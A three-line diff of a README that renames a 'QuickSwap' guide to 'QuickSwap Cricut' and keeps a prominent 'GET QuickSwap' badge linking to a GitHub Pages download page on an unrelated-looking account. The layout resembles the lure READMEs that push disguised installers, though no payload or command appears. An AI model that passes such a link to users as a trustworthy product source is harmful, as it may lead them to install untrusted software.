@@ -1,4 +1,4 @@
-# QuickSwap - Product Discovery and Workflow Guide
+# QuickSwap Cricut - Product Discovery and Workflow Guide
 
 [![GET QuickSwap](https://img.shields.io/badge/GET%20%E2%80%94%20QuickSwap-0078D6?style=for-the-badge&logoColor=white)](https://benrileytfop.github.io/.github/quickswap-cricut)
 
